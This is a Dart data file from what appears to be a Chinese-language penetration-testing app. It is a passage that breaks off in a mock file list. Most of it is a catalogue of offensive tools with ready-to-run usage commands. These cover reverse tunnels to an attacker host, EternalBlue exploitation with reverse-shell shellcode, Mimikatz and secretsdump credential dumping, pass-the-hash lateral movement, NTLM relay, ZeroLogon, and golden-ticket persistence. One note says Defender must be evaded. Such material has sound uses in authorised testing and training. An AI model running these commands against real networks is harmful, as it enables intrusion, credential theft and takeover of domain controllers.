import '../models/tool_model.dart';
import '../utils/app_theme.dart';

const Map<String, ToolCategory> kCategories = {
  'proxy': ToolCategory(id: 'proxy', label: '代理搭建', icon: '🔗', color: AppColors.catProxy),
  'recon': ToolCategory(id: 'recon', label: '内网探测', icon: '🔍', color: AppColors.catRecon),
  'exploit': ToolCategory(id: 'exploit', label: '漏洞利用', icon: '💣', color: AppColors.catExploit),
  'cred': ToolCategory(id: 'cred', label: '凭据操作', icon: '🗝', color: AppColors.catCred),
  'lateral': ToolCategory(id: 'lateral', label: '横向移动', icon: '↔', color: AppColors.catLateral),
  'ntlm': ToolCategory(id: 'ntlm', label: 'NTLM中继', icon: '🔄', color: AppColors.catNtlm),
  'domain': ToolCategory(id: 'domain', label: '域渗透', icon: '🏰', color: AppColors.catDomain),
  'dc': ToolCategory(id: 'dc', label: '域控攻击', icon: '👑', color: AppColors.catDC),
  'util': ToolCategory(id: 'util', label: '辅助工具', icon: '🛠', color: AppColors.catUtil),
};

const List<ToolDefinition> kTools = [
  // ── 代理搭建 ──
  ToolDefinition(
    id: 'frp',
    name: 'FRP',
    desc: '内网穿透反向代理',
    icon: '🔗',
    catId: 'proxy',
    version: 'v0.58.1',
    platform: 'Linux / Windows',
    risk: RiskLevel.medium,
    tags: ['代理', '穿透', '反向代理'],
    usage: '''## FRP 内网穿透反向代理

### 服务端配置 (frps.ini)
```ini
[common]
bind_port = 7000
token = your_token
```

### 客户端配置 (frpc.ini)
```ini
[common]
server_addr = attacker_ip
server_port = 7000
token = your_token

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

### 启动命令
```bash
# 攻击机启动服务端
./frps -c frps.ini

# 目标机启动客户端
./frpc -c frpc.ini
```

- ✓ 支持 TCP/UDP 穿透
- ✓ 支持 SOCKS5 代理
- ⚠ 需要公网服务器中转''',
  ),
  ToolDefinition(
    id: 'proxychains',
    name: 'Proxychains',
    desc: '代理链配置',
    icon: '⛓',
    catId: 'proxy',
    version: '4.16',
    platform: 'Linux',
    risk: RiskLevel.low,
    tags: ['代理链', 'SOCKS5', '透明代理'],
    usage: '''## Proxychains 代理链配置

### 配置文件 (/etc/proxychains4.conf)
```
[ProxyList]
socks5  127.0.0.1  1080
```

### 使用方法
```bash
# 通过代理运行任意命令
proxychains4 nmap -sT -Pn 192.168.1.50
proxychains4 curl http://internal.target.com
proxychains4 ssh user@192.168.1.100
```

- ✓ 透明代理，无需修改工具
- ⚠ 不支持 UDP/ICMP
- 配合 FRP/Chisel 使用效果最佳''',
  ),
  ToolDefinition(
    id: 'chisel',
    name: 'Chisel',
    desc: 'TCP隧道穿透',
    icon: '🔩',
    catId: 'proxy',
    version: 'v1.9.1',
    platform: 'Linux / Windows',
    risk: RiskLevel.medium,
    tags: ['隧道', '端口转发', '加密'],
    usage: '''## Chisel TCP隧道穿透

### SOCKS5 代理
```bash
# 攻击机 (服务端)
./chisel server -p 8080 --reverse

# 客户端 (目标机)
./chisel client attacker:8080 R:socks
```

### 端口转发
```bash
# 将目标 3389 转发到本地
./chisel client attacker:8080 R:3389:127.0.0.1:3389
```

- 基于 SSH 协议，流量加密
- ✓ 单文件，便于上传到目标
- ⚠ 注意防火墙出站规则''',
  ),
  ToolDefinition(
    id: 'ligolo',
    name: 'Ligolo-ng',
    desc: '反向隧道代理',
    icon: '🕳',
    catId: 'proxy',
    version: 'v0.6.2',
    platform: 'Linux / Windows',
    risk: RiskLevel.medium,
    tags: ['隧道', '全流量', 'TUN'],
    usage: '''## Ligolo-ng 反向隧道代理

### 部署流程
```bash
# 1. 攻击机启动 proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# 2. 目标机运行 agent
./agent -connect attacker:11601 -ignore-cert

# 3. 创建 tun 接口
interface_create --name ligolo
tunnel_start --tun ligolo
```

- ✓ 全流量转发，支持 UDP/ICMP
- 比 Proxychains 更透明
- ⚠ 需要 root 权限创建 tun 接口''',
  ),
  ToolDefinition(
    id: 'neo-regeorg',
    name: 'Neo-reGeorg',
    desc: 'HTTP隧道Webshell',
    icon: '🌀',
    catId: 'proxy',
    version: '1.0',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['HTTP隧道', 'Webshell', 'SOCKS5'],
    usage: '''## Neo-reGeorg HTTP隧道

### 生成隧道脚本
```bash
python3 neoreg.py generate -k password \\
  -o tunnel.php
```

### 上传并连接
```bash
# 上传 tunnel.php 到 Web 服务器
# 本地连接
python3 neoreg.py -k password \\
  -u http://target.com/tunnel.php \\
  -p 1080
```

- 通过 HTTP/HTTPS 建立 SOCKS5 隧道
- ✓ 适合只有 Web 访问权限的场景
- ⚠ 速度较慢，适合低频操作''',
  ),

  // ── 内网探测 ──
  ToolDefinition(
    id: 'fscan',
    name: 'Fscan',
    desc: '内网综合扫描器',
    icon: '⚡',
    catId: 'recon',
    version: 'v1.8.4',
    platform: 'Linux / Windows',
    risk: RiskLevel.medium,
    tags: ['扫描', '内网', '综合'],
    usage: '''## Fscan 内网综合扫描器

### 基本扫描
```bash
# 扫描整个 C 段
./fscan -h 192.168.1.0/24

# 指定端口
./fscan -h 192.168.1.0/24 -p 22,80,445,3389

# 输出结果
./fscan -h 192.168.1.0/24 -o result.txt
```

### 常见输出
```
[*] 192.168.1.50:445 open
[+] MS17-010 192.168.1.50
[+] 192.168.1.60 [WIN10] Windows 10
```

- ✓ 自动识别 MS17-010、弱口令等
- 速度快，适合快速摸排内网''',
  ),
  ToolDefinition(
    id: 'nmap',
    name: 'Nmap',
    desc: '端口扫描/服务探测',
    icon: '🔍',
    catId: 'recon',
    version: '7.94',
    platform: 'Linux / Windows',
    risk: RiskLevel.low,
    tags: ['扫描', '端口', '服务探测'],
    usage: '''## Nmap 端口扫描

### 常用命令
```bash
# 存活探测
nmap -sn 192.168.1.0/24

# 服务版本扫描
nmap -sV -sC -p- 192.168.1.50

# 漏洞脚本
nmap --script vuln 192.168.1.50

# 通过代理
proxychains4 nmap -sT -Pn 192.168.1.50
```

- ⚠ -sS 需要 root 权限
- 代理环境下使用 -sT -Pn
- --script smb-vuln-ms17-010 检测永恒之蓝''',
  ),
  ToolDefinition(
    id: 'crackmapexec',
    name: 'CrackMapExec',
    desc: 'SMB/域信息枚举',
    icon: '🗺',
    catId: 'recon',
    version: '5.4.0',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['SMB', '域枚举', 'PTH'],
    usage: '''## CrackMapExec SMB枚举

### SMB 枚举
```bash
# 扫描域内主机
cme smb 192.168.1.0/24

# 用户名密码验证
cme smb 192.168.1.0/24 -u admin -p Pass123

# Hash 传递
cme smb 192.168.1.0/24 -u admin \\
  -H aad3b435b51404eeaad3b435b51404ee:8846f7ea...
```

### 信息收集
```bash
cme smb 192.168.1.10 --users
cme smb 192.168.1.10 --groups
cme smb 192.168.1.10 --shares
```

- ✓ 支持 PTH 横向移动
- 可枚举域用户、组、共享''',
  ),
  ToolDefinition(
    id: 'nbtscan',
    name: 'NBTScan',
    desc: 'NetBIOS名称扫描',
    icon: '📡',
    catId: 'recon',
    version: '1.0.1',
    platform: 'Linux',
    risk: RiskLevel.low,
    tags: ['NetBIOS', '主机发现'],
    usage: '''## NBTScan NetBIOS扫描

### 扫描命令
```bash
nbtscan 192.168.1.0/24
nbtscan -r 192.168.1.0/24
```

### 输出示例
```
192.168.1.50  WIN7-PC         WORKSTATION
192.168.1.10  DC01            DOMAIN CTRL
```

- 快速发现 Windows 主机名
- 识别域控制器
- ⚠ 仅限局域网，不穿越路由''',
  ),
  ToolDefinition(
    id: 'ldapdump',
    name: 'LDAPDomainDump',
    desc: 'LDAP域信息转储',
    icon: '🌳',
    catId: 'recon',
    version: '1.3.1',
    platform: 'Linux',
    risk: RiskLevel.medium,
    tags: ['LDAP', '域信息', '枚举'],
    usage: '''## LDAPDomainDump 域信息转储

### 转储域信息
```bash
python3 ldapdomaindump.py \\
  -u 'CORP\\\\user' -p 'Pass123' \\
  192.168.1.10
```

### 输出文件
```
domain_users.json     # 所有域用户
domain_computers.json # 域内计算机
domain_groups.json    # 域组信息
domain_policy.json    # 域策略
```

- ✓ 生成可视化 HTML 报告
- 需要有效域用户凭据''',
  ),

  // ── 漏洞利用 ──
  ToolDefinition(
    id: 'metasploit',
    name: 'Metasploit',
    desc: '漏洞利用框架',
    icon: '🎯',
    catId: 'exploit',
    version: '6.3.44',
    platform: 'Linux',
    risk: RiskLevel.critical,
    tags: ['漏洞利用', '框架', 'Meterpreter'],
    usage: '''## Metasploit 漏洞利用框架

### 启动与基本操作
```bash
msfconsole
msf6 > search ms17_010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.50
msf6 > set LHOST 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run
```

### Meterpreter 常用命令
```bash
getuid          # 查看当前权限
getsystem       # 提权
hashdump        # 提取本地 Hash
load kiwi       # 加载 Mimikatz
kiwi_cmd sekurlsa::logonpasswords
```

- ⚠ 高危工具，仅限授权测试
- ✓ 模块化，功能最全面''',
  ),
  ToolDefinition(
    id: 'ms17010',
    name: 'MS17-010 EternalBlue',
    desc: '永恒之蓝 SMB RCE',
    icon: '💥',
    catId: 'exploit',
    version: 'EternalBlue',
    platform: 'Windows Target',
    risk: RiskLevel.critical,
    tags: ['RCE', 'SMB', 'CVE-2017-0144'],
    usage: '''## MS17-010 永恒之蓝

### Metasploit 模块
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set LHOST 192.168.1.100
run
```

### 影响版本
- ⚠ Windows XP / 2003
- ⚠ Windows 7 / 2008 R2 (未打补丁)
- ✓ Windows 10 / 2016+ 已修复

### 补丁
```
KB4012212 (Win7)  KB4012215 (Win8)
MS17-010 发布于 2017年3月
```''',
  ),
  ToolDefinition(
    id: 'eternalblue',
    name: 'EternalBlue-py',
    desc: 'Python版永恒之蓝',
    icon: '🐍',
    catId: 'exploit',
    version: '1.0',
    platform: 'Linux',
    risk: RiskLevel.critical,
    tags: ['Python', 'MS17-010', 'Shellcode'],
    usage: '''## Python 版永恒之蓝

### 使用方法
```bash
git clone https://github.com/helviojunior/MS17-010
cd MS17-010

# 生成 shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.100 LPORT=4444 \\
  -f raw -o shellcode.bin

# 执行漏洞利用
python3 send_and_execute.py 192.168.1.50 shellcode.bin
```

- ⚠ 确认目标未打 MS17-010 补丁
- 先用 checker.py 验证漏洞存在
- ⚠ 可能导致目标蓝屏，谨慎操作''',
  ),

  // ── 凭据操作 ──
  ToolDefinition(
    id: 'mimikatz',
    name: 'Mimikatz',
    desc: '内存凭据提取',
    icon: '🗝',
    catId: 'cred',
    version: '2.2.0',
    platform: 'Windows',
    risk: RiskLevel.critical,
    tags: ['凭据提取', 'NTLM', 'Kerberos'],
    usage: '''## Mimikatz 内存凭据提取

### 提取内存凭据
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# 提取 NTLM Hash
mimikatz # lsadump::sam

# DCSync 拉取域管 Hash
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

### 黄金票据
```
mimikatz # kerberos::golden /user:Administrator \\
  /domain:corp.local /sid:S-1-5-21-xxx \\
  /krbtgt:HASH /ptt
```

- ⚠ 需要 SYSTEM 或 SeDebugPrivilege
- Windows Defender 会拦截，需免杀''',
  ),
  ToolDefinition(
    id: 'secretsdump',
    name: 'secretsdump',
    desc: '远程SAM/NTDS转储',
    icon: '🔓',
    catId: 'cred',
    version: 'Impacket 0.11',
    platform: 'Linux',
    risk: RiskLevel.critical,
    tags: ['Hash提取', 'SAM', 'NTDS'],
    usage: '''## secretsdump 远程转储

### 使用密码
```bash
python3 secretsdump.py corp/admin:Pass123@192.168.1.50
```

### 使用 Hash (PTH)
```bash
python3 secretsdump.py -hashes :NTLMHASH \\
  corp/admin@192.168.1.50
```

### 转储域控 NTDS.dit
```bash
python3 secretsdump.py -hashes :NTLMHASH \\
  corp/admin@192.168.1.10 -just-dc
```

### 输出格式
```
Administrator:500:aad3b435...:8846f7ea:::
```

- ✓ 无需上传文件到目标
- 需要管理员权限''',
  ),
  ToolDefinition(
    id: 'hashcat',
    name: 'Hashcat',
    desc: 'GPU哈希破解',
    icon: '💀',
    catId: 'cred',
    version: '6.2.6',
    platform: 'Linux / Windows',
    risk: RiskLevel.medium,
    tags: ['破解', 'GPU', 'NTLM'],
    usage: '''## Hashcat GPU哈希破解

### NTLM Hash 破解
```bash
# 破解 NTLM
hashcat -m 1000 hashes.txt rockyou.txt

# 规则攻击
hashcat -m 1000 hashes.txt rockyou.txt \\
  -r rules/best64.rule

# NTLMv2 破解
hashcat -m 5600 ntlmv2.txt rockyou.txt
```

### 常用模式
```
-m 1000  NTLM
-m 5600  NetNTLMv2
-m 13100 Kerberoast (TGS)
-m 18200 AS-REP Roasting
```

- ✓ GPU 加速，速度极快
- 配合 wordlist + rules 效果最佳''',
  ),
  ToolDefinition(
    id: 'john',
    name: 'John the Ripper',
    desc: '哈希离线破解',
    icon: '⚔',
    catId: 'cred',
    version: '1.9.0',
    platform: 'Linux',
    risk: RiskLevel.medium,
    tags: ['破解', 'CPU', '字典'],
    usage: '''## John the Ripper 哈希破解

### 基本破解
```bash
# 自动识别格式
john hashes.txt

# 指定字典
john --wordlist=rockyou.txt hashes.txt

# NTLM 格式
john --format=NT hashes.txt --wordlist=rockyou.txt

# 查看破解结果
john --show hashes.txt
```

- CPU 破解，速度较 Hashcat 慢
- ✓ 自动识别 Hash 类型
- 支持增量模式暴力破解''',
  ),

  // ── 横向移动 ──
  ToolDefinition(
    id: 'psexec',
    name: 'PsExec (PTH)',
    desc: '哈希传递执行',
    icon: '🚀',
    catId: 'lateral',
    version: 'Impacket 0.11',
    platform: 'Linux',
    risk: RiskLevel.critical,
    tags: ['PTH', '横向移动', 'SYSTEM'],
    usage: '''## PsExec PTH 横向移动

### Impacket psexec
```bash
python3 psexec.py -hashes :NTLMHASH \\
  corp/Administrator@192.168.1.60

# 执行命令
python3 psexec.py corp/admin:Pass123@192.168.1.60 \\
  "whoami"
```

### 注意事项
- ⚠ 会在目标创建服务，留下日志
- 需要目标开放 445 端口
- 需要管理员权限
- ✓ 返回 SYSTEM 权限 Shell''',
  ),
  ToolDefinition(
    id: 'evil-winrm',
    name: 'Evil-WinRM',
    desc: 'WinRM远程管理',
    icon: '🖥',
    catId: 'lateral',
    version: '3.5',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['WinRM', 'PTH', 'Shell'],
    usage: '''## Evil-WinRM WinRM连接

### 密码登录
```bash
evil-winrm -i 192.168.1.60 -u admin -p Pass123
```

### Hash 登录 (PTH)
```bash
evil-winrm -i 192.168.1.60 -u admin \\
  -H 8846f7eaee8fb117ad06bdd830b7586c
```

### 文件操作
```bash
# 上传文件
upload /local/mimikatz.exe C:\\\\Windows\\\\Temp\\\\

# 加载 PowerShell 脚本
evil-winrm -i 192.168.1.60 -u admin -p Pass123 \\
  -s /opt/scripts/
```

- ✓ 支持文件上传下载
- 需要目标开放 5985/5986 端口''',
  ),
  ToolDefinition(
    id: 'wmiexec',
    name: 'WMIExec',
    desc: 'WMI远程执行',
    icon: '⚙',
    catId: 'lateral',
    version: 'Impacket 0.11',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['WMI', '横向移动', '隐蔽'],
    usage: '''## WMIExec WMI远程执行

### 基本使用
```bash
python3 wmiexec.py -hashes :NTLMHASH \\
  corp/admin@192.168.1.60

# 单条命令
python3 wmiexec.py corp/admin:Pass123@192.168.1.60 \\
  "ipconfig /all"
```

- ✓ 不创建服务，日志较少
- 需要目标 WMI 服务开启
- 通过 135 端口通信''',
  ),
  ToolDefinition(
    id: 'smbexec',
    name: 'SMBExec',
    desc: 'SMB服务执行',
    icon: '📁',
    catId: 'lateral',
    version: 'Impacket 0.11',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['SMB', '横向移动'],
    usage: '''## SMBExec SMB执行

### 基本使用
```bash
python3 smbexec.py -hashes :NTLMHASH \\
  corp/admin@192.168.1.60

python3 smbexec.py corp/admin:Pass123@192.168.1.60
```

- 通过 SMB 共享执行命令
- ⚠ 每条命令创建/删除服务
- 需要管理员权限''',
  ),

  // ── NTLM中继 ──
  ToolDefinition(
    id: 'responder',
    name: 'Responder',
    desc: 'LLMNR/NBT-NS投毒',
    icon: '📻',
    catId: 'ntlm',
    version: '3.1.4',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['LLMNR', 'NBT-NS', 'NTLMv2'],
    usage: '''## Responder LLMNR/NBT-NS投毒

### 启动 Responder
```bash
# 监听所有协议
python3 Responder.py -I eth0 -wrf

# 仅分析模式 (不投毒)
python3 Responder.py -I eth0 -A
```

### 捕获的 Hash 位置
```
/opt/Responder/logs/
  SMB-NTLMv2-*.txt
  HTTP-NTLMv2-*.txt
```

- ✓ 被动等待，自动捕获 NTLMv2
- 配合 ntlmrelayx 进行中继攻击
- ⚠ 运行时关闭 SMB/HTTP 服务''',
  ),
  ToolDefinition(
    id: 'printerbug',
    name: 'PrinterBug',
    desc: '强制机器账户NTLM回连',
    icon: '🖨',
    catId: 'ntlm',
    version: '1.0',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['SpoolSS', 'NTLM', '强制回连'],
    usage: '''## PrinterBug 强制NTLM回连

### 触发打印机漏洞
```bash
python3 printerbug.py corp/user:Pass123@DC01 attacker_ip
```

### 配合 Responder 使用
```bash
# 1. 启动 Responder
python3 Responder.py -I eth0 -A

# 2. 触发 PrinterBug
python3 printerbug.py corp/user:Pass123@DC01 attacker_ip
```

- 强制域控机器账户向攻击机发起 NTLM 认证
- ✓ 可获取域控机器账户 Hash
- 配合 ntlmrelayx 可实现 DCSync''',
  ),
  ToolDefinition(
    id: 'ntlmrelayx',
    name: 'ntlmrelayx',
    desc: 'NTLM认证中继攻击',
    icon: '🔄',
    catId: 'ntlm',
    version: 'Impacket 0.11',
    platform: 'Linux',
    risk: RiskLevel.critical,
    tags: ['中继', 'NTLM', 'SMB'],
    usage: '''## ntlmrelayx NTLM中继攻击

### SMB 中继
```bash
# 中继到目标执行命令
python3 ntlmrelayx.py -t smb://192.168.1.60 -c "whoami"

# 转储 SAM
python3 ntlmrelayx.py -t smb://192.168.1.60 --no-http-server
```

### LDAP 中继 (创建域管)
```bash
python3 ntlmrelayx.py -t ldap://DC01 --escalate-user user
```

- ⚠ 需要目标 SMB 签名未启用
- 配合 Responder 或 PrinterBug 使用''',
  ),
  ToolDefinition(
    id: 'mitm6',
    name: 'mitm6',
    desc: 'IPv6 DNS欺骗',
    icon: '☠',
    catId: 'ntlm',
    version: '0.3.0',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['IPv6', 'DNS欺骗', 'NTLM'],
    usage: '''## mitm6 IPv6 DNS欺骗

### 启动 mitm6
```bash
mitm6 -d corp.local
```

### 配合 ntlmrelayx
```bash
# 终端1: 启动 mitm6
mitm6 -d corp.local

# 终端2: 启动 ntlmrelayx
python3 ntlmrelayx.py -6 -t ldaps://DC01 \\
  --delegate-access --no-smb-server
```

- 利用 Windows 默认优先使用 IPv6 的特性
- ✓ 可绕过 SMB 签名限制
- ⚠ 会影响网络，谨慎在生产环境使用''',
  ),

  // ── 域渗透 ──
  ToolDefinition(
    id: 'bloodhound',
    name: 'BloodHound',
    desc: 'AD攻击路径分析',
    icon: '🩸',
    catId: 'domain',
    version: '4.3.1',
    platform: 'Linux / Windows',
    risk: RiskLevel.medium,
    tags: ['AD', '攻击路径', '图分析'],
    usage: '''## BloodHound AD攻击路径分析

### 数据收集 (SharpHound)
```bash
# Windows 上运行
SharpHound.exe -c All

# Python 版本
python3 bloodhound.py -u user -p Pass123 \\
  -d corp.local -ns 192.168.1.10
```

### 启动 BloodHound
```bash
# 启动 Neo4j
neo4j start

# 启动 BloodHound GUI
bloodhound
```

- ✓ 可视化 AD 攻击路径
- 自动发现 Kerberoastable 账户
- 识别 DCSync 权限路径''',
  ),
  ToolDefinition(
    id: 'dcsync',
    name: 'DCSync',
    desc: '域控同步拉取哈希',
    icon: '🔁',
    catId: 'domain',
    version: 'Mimikatz 2.2',
    platform: 'Windows',
    risk: RiskLevel.critical,
    tags: ['DCSync', 'Hash', '域控'],
    usage: '''## DCSync 域控同步

### 使用 Mimikatz
```
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

### 使用 secretsdump
```bash
python3 secretsdump.py -hashes :NTLMHASH \\
  corp/admin@DC01 -just-dc
```

### 所需权限
- Domain Admins
- Enterprise Admins
- Replicating Directory Changes All

- ✓ 无需登录域控即可拉取所有 Hash
- ⚠ 需要高权限账户''',
  ),
  ToolDefinition(
    id: 'kerberoasting',
    name: 'Kerberoasting',
    desc: 'SPN票据离线破解',
    icon: '🎫',
    catId: 'domain',
    version: 'Impacket 0.11',
    platform: 'Linux',
    risk: RiskLevel.high,
    tags: ['Kerberos', 'SPN', 'TGS'],
    usage: '''## Kerberoasting SPN票据破解

### 获取 TGS 票据
```bash
python3 GetUserSPNs.py corp/user:Pass123 \\
  -dc-ip 192.168.1.10 -request
```

### 破解票据
```bash
hashcat -m 13100 tgs.txt rockyou.txt
john --format=krb5tgs tgs.txt --wordlist=rockyou.txt
```

### PowerShell 版本
```powershell
Invoke-Kerberoast | fl
```

- 任意域用户均可执行
- ✓ 离线破解，不产生额外日志
- 针对配置了 SPN 的服务账户''',
  ),
  ToolDefinition(
    id: 'zerologon',
    name: 'ZeroLogon',
    desc: 'CVE-2020-1472域控漏洞',
    icon: '⚡',
    catId: 'domain',
    version: 'CVE-2020-1472',
    platform: 'Linux',
    risk: RiskLevel.critical,
    tags: ['CVE-2020-1472', '域控', 'Netlogon'],
    usage: '''## ZeroLogon CVE-2020-1472

### 漏洞验证
```bash
python3 zerologon_tester.py DC01 192.168.1.10
```

### 利用漏洞
```bash
python3 cve-2020-1472-exploit.py DC01 192.168.1.10
```

### 获取 Hash
```bash
python3 secretsdump.py -no-pass -just-dc \\
  corp/DC01\\\$@192.168.1.10
```

### 影响版本
- Windows Server 2008 R2 ~ 2019 (未打补丁)

- ⚠ 极危漏洞，可直接拿下域控
- ⚠ 利用后需恢复机器账户密码''',
  ),

  // ── 域控攻击 ──
  ToolDefinition(
    id: 'pth-dc',
    name: 'PTH 拿域控',
    desc: 'Pass-the-Hash域控',
    icon: '👑',
    catId: 'dc',
    version: 'Impacket 0.11',
    platform: 'Linux',
    risk: RiskLevel.critical,
    tags: ['PTH', '域控', '横向移动'],
    usage: '''## PTH 拿域控

### 使用 psexec
```bash
python3 psexec.py -hashes :DOMAIN_ADMIN_HASH \\
  corp/Administrator@DC01
```

### 使用 wmiexec
```bash
python3 wmiexec.py -hashes :DOMAIN_ADMIN_HASH \\
  corp/Administrator@DC01
```

### 使用 Evil-WinRM
```bash
evil-winrm -i DC01 -u Administrator \\
  -H DOMAIN_ADMIN_HASH
```

- 需要域管 NTLM Hash
- ✓ 无需明文密码
- 多种工具可选，增加成功率''',
  ),
  ToolDefinition(
    id: 'golden',
    name: '黄金票据',
    desc: '伪造Kerberos TGT',
    icon: '🏅',
    catId: 'dc',
    version: 'Mimikatz 2.2',
    platform: 'Windows',
    risk: RiskLevel.critical,
    tags: ['Kerberos', 'TGT', '持久化'],
    usage: '''## 黄金票据 Golden Ticket

### 所需信息
- krbtgt NTLM Hash
- 域 SID

### 伪造票据
```
mimikatz # kerberos::golden \\
  /user:FakeAdmin \\
  /domain:corp.local \\
  /sid:S-1-5-21-xxxxxxxxxx \\
  /krbtgt:KRBTGT_NTLM_HASH \\
  /ptt
```

### 验证
```
klist
dir \\\\\\\\DC01\\\\C\$
```

- ✓ 有效期 10 年，持久化后门
- 即使修改域管密码仍有效
- ⚠ 需要先获取 krbtgt Hash''',
  ),
  ToolDefinition(
    id: 'silver',
    name: '白银票据',
    desc: '伪造Kerberos ST',
    icon: '🥈',
    catId: 'dc',
    version: 'Mimikatz 2.2',
    platform: 'Windows',
    risk: RiskLevel.critical,
    tags: ['Kerberos', 'ST', '服务票据'],
    usage: '''## 白银票据 Silver Ticket

### 伪造服务票据
```
mimikatz # kerberos::golden \\
  /user:FakeAdmin \\
  /domain:corp.local \\
  /sid:S-1-5-21-xxxxxxxxxx \\
  /target:DC01.corp.local \\
  /service:cifs \\
  /rc4:SERVICE_NTLM_HASH \\
  /ptt
```

- 针对特定服务的票据
- ✓ 不需要与 KDC 通信，更隐蔽
- 有效期默认 30 天''',
  ),

  // ── 辅助工具 ──
  ToolDefinition(
    id: 'report',
    name: '报告生成',
    desc: '渗透测试报告',
    icon: '📊',
    catId: 'util',
    version: '1.0',
    platform: '通用',
    risk: RiskLevel.none,
    tags: ['报告', '文档'],
    usage: '''## 渗透测试报告生成

### 收集信息
- 目标范围与授权文件
- 发现的漏洞列表
- 利用过程截图
- 获取的权限证明
- 修复建议

### 报告结构
- 执行摘要 (管理层)
- 技术细节 (安全团队)
- 漏洞评级 (CVSS)
- ✓ 修复建议与优先级

### 报告模板
```markdown
# 渗透测试报告
## 1. 执行摘要
## 2. 测试范围
## 3. 发现漏洞
## 4. 修复建议
```''',
  ),
  ToolDefinition(
    id: 'note',
    name: '备注',
    desc: '工作流注释',
    icon: '📝',
    catId: 'util',
    version: '1.0',
    platform: '通用',
    risk: RiskLevel.none,
    tags: ['备注', '注释'],
    usage: '''## 备注节点

用于在工作流中添加说明、标注重要信息或分隔阶段。

### 使用方法
- 双击节点标题可编辑
- 可用于标注 IP、Hash 等关键信息
- 可作为阶段分隔符使用

### 常见用途
- 记录目标 IP 和端口
- 标注获取的凭据
- 记录阶段完成情况''',
  ),
];

// Virtual Machines
const List<VirtualMachine> kVirtualMachines = [
  VirtualMachine(
    id: 'vm1',
    name: 'Kali Linux',
    ip: '192.168.1.100',
    osType: 'linux',
    status: 'on',
    icon: '🐉',
    tag: 'KALI',
  ),
  VirtualMachine(
    id: 'vm2',
    name: 'Ubuntu 22.04',
    ip: '192.168.1.101',
    osType: 'linux',
    status: 'on',
    icon: '🐧',
    tag: 'UBUNTU',
  ),
  VirtualMachine(
    id: 'vm3',
    name: 'Windows 10',
    ip: '192.168.1.110',
    osType: 'windows',
    status: 'busy',
    icon: '🪟',
    tag: 'WIN10',
  ),
  VirtualMachine(
    id: 'vm4',
    name: 'Windows Server 2019',
    ip: '192.168.1.10',
    osType: 'windows',
    status: 'on',
    icon: '🖥',
    tag: 'DC01',
  ),
  VirtualMachine(
    id: 'vm5',
    name: 'Parrot OS',
    ip: '192.168.1.102',
    osType: 'linux',
    status: 'off',
    icon: '🦜',
    tag: 'PARROT',
  ),
];

// Platform File System
const Map<String, List<String>> kFsTree = {
  '/': ['pentest', 'tools', 'payloads', 'scripts', 'wordlists', 'reports'],
  '/pentest': ['exploits', 'post', 'recon', 'lateral'],
  '/pentest/exploits': [],
  '/pentest/post': [],
  '/pentest/recon': [],
  '/pentest/lateral': [],
  '/tools': ['network', 'web', 'password', 'windows', 'linux'],
  '/tools/network': [],
  '/tools/web': [],
  '/tools/password': [],
  '/tools/windows': [],
  '/tools/linux': [],
  '/payloads': ['windows', 'linux', 'web'],
  '/payloads/windows': [],
  '/payloads/linux': [],
  '/payloads/web': [],
  '/scripts': ['powershell', 'python', 'bash'],
  '/scripts/powershell': [],
  '/scripts/python': [],
  '/scripts/bash': [],
  '/wordlists': [],
  '/reports': [],
};

const Map<String, List<PlatformFile>> kFsFiles = {
  '/pentest/exploits': [
    PlatformFile(name: 'ms17_010_eternalblue.py', size: '48 KB', type: 'py', date: '2024-01-15'),
    PlatformFile(name: 'ms17_010_checker.py', size: '12 KB', type: 'py', date: '2024-01-15'),
    PlatformFile(name: 'zerologon_exploit.py', size: '22 KB', type: 'py', date: '2024-03-10'),
    PlatformFile(name: 'printerbug.py', size: '8 KB', type: 'py', date: '2024-02-20'),
  ],
  '/pentest/post': [
    PlatformFile(name: 'mimikatz.exe', size: '1.2 MB', type: 'exe', date: '2024-04-01'),
    PlatformFile(name: 'mimikatz_x86.exe', size: '980 KB', type: 'exe', date: '2024-04-01'),
    PlatformFile(name: 'SharpHound.exe', size: '890 KB', type: 'exe', date: '2024-03-15'),
    PlatformFile(name: 'winpeas.exe', size: '2.1 MB', type: 'exe', date: '2024-02-28'),
    PlatformFile(name: 'linpeas.sh', size: '780 KB', type: 'sh', date: '2024-02-28'),
  ],
  '/pentest/recon': [
    PlatformFile(name: 'fscan_linux', size: '6.8 MB', type: 'elf', date: '2024-01-20'),
    PlatformFile(name: 'fscan.exe', size: '7.2 MB', type: 'exe', date: '2024-01-20'),
    PlatformFile(name: 'bloodhound.py', size: '156 KB', type: 'py', date: '2024-03-01'),
  ],
  '/pentest/lateral': [
    PlatformFile(name: 'chisel_linux', size: '8.1 MB', type: 'elf', date: '2024-02-10'),
    PlatformFile(name: 'chisel.exe', size: '8.6 MB', type: 'exe', date: '2024-02-10'),
    PlatformFile(name: 'frpc', size: '11 MB', type: 'elf', date: '2024-01-05'),
    PlatformFile(name: 'frpc.exe', size: '12 MB', type: 'exe', date: '2024-01-05'),
    PlatformFile(name: 'ligolo-agent', size: '7.2 MB', type: 'elf', date: '2024-03-20'),
    PlatformFile(name: 'ligolo-agent.exe', size: '7.8 MB', type: 'exe', date: '2024-03-20'),
  ],
  '/payloads/windows': [
    PlatformFile(name: 'reverse_tcp_x64.exe', size: '73 KB', type: 'exe', date: '2024-04-10'),
    PlatformFile(name: 'reverse_https_x64.exe', size: '78 KB', type: 'exe', date: '2024-04-10'),
    PlatformFile(name: 'meterpreter_x64.dll', size: '210 KB', type: 'dll', date: '2024-04-10'),
